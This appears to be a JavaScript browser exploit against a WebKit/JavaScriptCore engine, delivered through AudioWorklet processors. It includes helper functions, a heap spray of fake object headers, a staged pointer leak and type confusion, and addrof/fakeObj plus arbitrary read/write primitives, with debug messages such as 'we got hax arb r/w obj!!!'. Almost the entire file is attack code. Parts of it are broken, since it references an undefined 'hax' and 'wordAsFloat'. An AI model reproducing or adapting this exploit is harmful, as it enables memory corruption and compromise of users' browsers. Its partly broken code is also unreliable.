//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Display alert message
function strcmp(b, str)
{
    var fn = typeof b == "function" ? b : function(i) { return b[i]; };
    for(var i = 0; i < str.length; ++i)
    {
        if(fn(i) != str.charCodeAt(i))
        {
            
            return false;
        }
    }
    return fn(str.length) == 0;
}

function delay(ms = 1000){
    var t1 = Date.now();
    while(Date.now() - t1 <= ms){

    }
}
// Return the hexadecimal representation of the given byte.
function hex(b,c) {
    if (c) {
    if (b < 0)
        return `-${hex(-b)}`
    return `0x${b.toString(16)}`
    } else {
    return ('0' + b.toString(16)).substr(-2);
    }
}


function hex1(x) {
    if (x < 0)
        return `-${hex1(-x)}`;
    return `0x${x.toString(16)}`;
}


// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

function sleep( sleepDuration ){
    var now = new Date().getTime();
    while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
}
function gc() {
    for (let i = 0; i < 0x10; i++) {
            new ArrayBuffer(0x1000000);
        }
}
let data_view = new DataView(new ArrayBuffer(8));
var floatAsQword = float => { //f2i
    data_view.setFloat64(0, float, true);
    var low = data_view.getUint32(0, true);
    var high = data_view.getUint32(4, true);
    return low + (high * 0x100000000);
}
var qwordAsTagged = qword =>{
    return qwordAsFloat( qword- 0x02000000000000);
}
var qwordAsFloat = qword => { //i2f
    data_view.setUint32(0, qword%0x100000000, true);
    data_view.setUint32(4, qword/0x100000000, true);
    //data_view.setBigUint64(0, qword);
    return data_view.getFloat64(0, true);
}
function change_container(header, arr){
    try{}
    catch{}
    for(var i = 0; i < 0x100000; i++){
        ds[i].cellHeader = header;
        ds[i].butterfly = arr;
    }
}
const MY_OBJECT_OFFSET = 0x14fb0;
//MakeJitCompiledFunction();
//MakeJitCompiledFunction();


var a= new Array(10);
for(var i = 0; i < 0x1000; i++)
	a[i]= Array(0x40).fill(0.0);
var b = Array(0x40).fill(0.0);
var c = Array(0x40).fill(0.0);
var ds = new Array(0x100000);

let noCoW =13.37
let pad = new Array(noCoW, 2.2, {}, 13.37);
let pad1 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
let pad2 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);

var evil_arr = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);

var boxed = new Array(qwordAsTagged(0x41414141414141), noCoW, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
//var boxed = new Array(qwordAsTagged(0x41414141414141),{},{},{},{},{})
var unboxed = new Array(noCoW, 13.37, 13.37, 13.37, 5.5, 6.6, 7.7, 8,8);



var victim = [noCoW, 14.47, 15.57];
victim['prop'] = 13.37;
victim['prop_1'] = 13.37;
//victi
let pad3 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);

//var gcPreventer = [];
var structure_id = 0;
c[0] = 1.1;
var fuck = undefined;
var fuck2 = undefined;
var driver = undefined;
var stage = "leak"
var jscell_header = undefined;
var evil_arr_butterfly = undefined;
var expected_ptr = undefined;
eval(`
for(var i = 0; i < 0x10000; i++){
    var tag = qwordAsTagged(0x0108230700001000)
    ds[i] = {
        cellHeader1: tag,
        butterfly1: evil_arr,
        cellHeader2: tag,
        butterfly2: evil_arr,
        cellHeader3: tag,
        butterfly3: evil_arr
    };
}


`); //sprayed doubled array flags and butterfly is victim aka evil_arr

b.process = (inputs, outputs, parameters)=>{
   
    var structure_spray = []
    var i = 0;
    var ary = [13.37];
    ary.prop = 1234;
    ary['p'+i] = 13.37;
    structure_spray.push(ary);

var victim1 = structure_spray[0];
    if(stage == "leak"){
        var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
        expected_ptr = Number(expected_ptr);
        c[8] = qwordAsFloat(expected_ptr + 0x4010);
        c[9] = qwordAsFloat(0x0);
        stage  = "bypass_etc";
        fuck.port.postMessage(c);
        //sleep(4000);
        return true;
    }
    else if(stage == "bypass_etc"){
        //fuck.port.postMessage(typeof parameters);
        var gcPreventer = [];
        for (let i = 0; i < 2; i++) {
            let a = i == 0 ? parameters : victim;
            fuck.port.postMessage("1st" + a[0]);
            gcPreventer.push(a[0]);
        }
        jscell_header = gcPreventer[0];
        
        var gcPreventer = [];
        var e = [{},{}];
        e.prop = 13.37
        e['p'+1] = 13.37
        for (let i = 0; i < 2; i++) {
            let a = i == 0 ? parameters : victim;
            fuck.port.postMessage("2nd" + a[1]);
            gcPreventer.push(a[1]);
        }
        //fuck.port.postMessage()

        evil_arr_butterfly = floatAsQword(gcPreventer[0]);
        //var u = [{},{},13.37]
        var gcPreventer = [];
        for (let i = 0; i < 2; i++) {
            let a = i == 0 ? parameters : e;
            fuck.port.postMessage("3rd" + a[2]);
            gcPreventer.push(a[2]);
        }
        var contigousflags = gcPreventer[0];

        //fuck
        /*for (let i = 0; i < 2; i++) {
            let a = i == 0 ? pad2 : victim;
            fuck.port.postMessage(a[1]);
            gcPreventer.push(a[1]);
        }*/

        
        structure_id = floatAsQword(jscell_header) & 0xFFFFFFFF;
        var contigousid = floatAsQword(contigousflags) & 0xFFFFFFFF;
        if(structure_id == 0 ){
            fuck.port.postMessage(`retry`);
            
            c[8] = qwordAsFloat(0);
            parameters = null;
            //sleep(10000000);
            //stage = "leak";
            return false;
        }
        fuck.port.postMessage("double struc id : " + structure_id)
        fuck.port.postMessage(`double array jscell header : ${hex1(floatAsQword(jscell_header)).toString(16)}`);
        fuck.port.postMessage("contigous struc id : " + contigousid)
        fuck.port.postMessage("array contigous jscell_header" + hex1(floatAsQword(contigousflags)).toString(16))
        fuck.port.postMessage(`evil_arr_butterfly : ${evil_arr_butterfly.toString(16)}`);
        //return false;
        var cellHeader = jscell_header//qwordAsTagged( (0x01082307 * 0x100000000) + structure_id);
        //change_container(cellHeader, evil_arr);
        c[8] = qwordAsFloat(evil_arr_butterfly);
        evil_arr[0] = cellHeader;
        evil_arr[1] = qwordAsFloat(evil_arr_butterfly-0x8);

        stage = "r/w";
        return true;
    }
    else if(stage == "r/w"){
        for(var i =0; i < 2; i++){
            let a = i == 0 ? parameters: pad;
            a[0] = qwordAsFloat(0x133700001337);
        }
        fuck.port.postMessage(`evil_arr length : ${(evil_arr.length).toString(16)}`);
        evil_arr[0] = qwordAsFloat( (0x00010100 * 0x100000000) + structure_id);
        evil_arr[1] = qwordAsFloat(0);
        var boxed_offset = 0;
        for(var i = 0; i < evil_arr.length; i++){
            if(evil_arr[i] == qwordAsFloat(0x0041414141414140)){
                fuck.port.postMessage(`boxed_arr length offset: ${(i)}`);
                boxed_offset = i;
                break;
            }
        }
        /*for (var i = 0; i < boxed.length; i++) {
            boxed[i] = 13.37
        }*/
        //delete boxed[0];
        //delete boxed[0];
        //theoretically soeaking evil arr is unboxed and boxed is "JSValue or array contingous"
        var addrof = (obj)=>{
            boxed[0] = obj;
            return floatAsQword(evil_arr[boxed_offset]); //get a raw double value represented as
            //as float then convert that to qword
            //boxed_offset is the shared butterfly sort to say of another exploit where they
            //overlap
        }
        var fakeObj = (addr)=>{
            evil_arr[boxed_offset] = qwordAsFloat(addr);
            //return boxed[0]; //array contigous so pull object out
            return boxed[0];
        }
        var outer = {
        header: jscell_header, // cell
        butterfly: victim1, // butterfly
    };
        var boxed = [{}];
        var unboxed = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37];
        unboxed[0] = 13.37;
        //var hax = fakeObj(addrof(outer) + 0x10);
        fuck.port.postMessage("we got hax arb r/w obj!!!");
        /*hax[1] = unboxed;
        fuck.port.postMessage("shared bfly " + floatAsQword(victim1[1]))
        var shared = floatAsQword(victim1[0])
        hax[1] = boxed;
        victim1[0] = qwordAsFloat(shared);
        outer.header = jscell_header;*/
        //var origButterfly = hax[1];
        function assert(expectedResult, descriptionOfCorrectResult) {
   if (!expectedResult) {
      fuck.port.postMessage(descriptionOfCorrectResult);
      return false;
   } else {
      fuck.port.postMessage('test passed');
      return true;
   }
};

        fuck.port.postMessage("here111")
        var memory = {
        addrof: addrof,
        fakeobj: fakeObj,

        // Write an int64 to the given address.
        writeInt64(addr, int64) {
            hax[1] = qwordAsFloat(addr+0x10);
            victim.pointer = hex(int64);
        },

        // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
        write16(addr, value) {
            // Set butterfly of victim object and dereference.
            hax[1] = wordAsFloat(addr+0x10);
            victim.pointer = value;
        },

        // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
        write(addr, data) {
            while (data.length % 4 != 0)
                data.push(0);

            var bytes = new Uint8Array(data);
            var ints = new Uint16Array(bytes.buffer);

            for (var i = 0; i < ints.length; i++)
                this.write16(addr + (2 * i), ints[i]);
        },

        // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
        read64(addr) {
            // Set butterfly of victim object and dereference.
            hax[1] = qwordAsFloat(addr+0x10);
            return this.addrof(victim.pointer);
        },

        // Verify that memory read and write primitives work.
        test() {
            var v = {};
            var obj = {p: v};

            var addr = this.addrof(obj);
            fuck.port.postMessage("test addr" + addr)
            assert(this.fakeobj(addr).p == v, "addrof and/or fakeobj does not work");

            var propertyAddr = (addr+0x10);

            var value = this.read64(propertyAddr);
            assert(qwordAsFloat(value) == qwordAsFloat(addrof(v)), "read64 does not work");
        },
    }


    memory.test();
        
        //var shared_butterfly = floatAsQword(e[1]);
        fuck.port.postMessage("we hax1 arb r/w obj!!!");
        //hax[1] = boxed;
        //e[1] = qwordAsFloat(shared_butterfly);
        //outer.header = jscell_header;
        /*var outer = {
            hex1(floatAsQword(jscell_header))
        }*/
        /*var read64: function(where) {
            evil_arr[boxed_offset] = qwordAsFloat(where + 0x10);

        }*/
        //fuck.port.postMessage("header of array double" + hex1(addrof([13.37,13.37])))
        //fuck.port.postMessage("header of array contigous" + hex1(addrof([13.37,13.37])))

        //fuck.port.postMessage("about to test and see if addrof and fakeobj work");
        //fuck.port.postMessage("before proceeding");
        /*if(hex1(fakeObj(hex1(addrof({a:0x1337}))).a)!= 0x1337) {
            fuck.port.postMessage(`retry`);
        }*/
        
        
        fuck.port.postMessage("it works!!!");

        stage="gc_test"
        return true;
    }
    else if(stage=="gc_test"){
        gc();
        fuck.port.postMessage("Garbage Collected");
        //sleep(100000);
        return false;
    }
    //  sleep(2000);
    return true;
}
class OrigineWorklet extends AudioWorkletProcessor {
    constructor(){
        super();
        //var fuck2 = new AudioWorkletProcessor();
        return b;
    }
    static get parameterDescriptors() {
        return []
    }
    process (inputs, outputs, parameters) {
        
        return false;
    }
}
class OrigineWorklet2 extends AudioWorkletProcessor {
    constructor(){
        super();
        //console.log(c);
        this.port.onmessage = (e)=>{
        }
        
        fuck = this;
        //fuck.port.postMessage(c);
        return this;
    }
    static get parameterDescriptors() {
        return [{
            name: 'param2',
            defaultValue: 0.1337
        }];
    }
    process (inputs, outputs, parameters) {
        //
        //
        //this.port.postMessage(c);
        return false;
    }
}
registerProcessor('OrigineWorklet', OrigineWorklet);
registerProcessor('OrigineWorklet2', OrigineWorklet2);
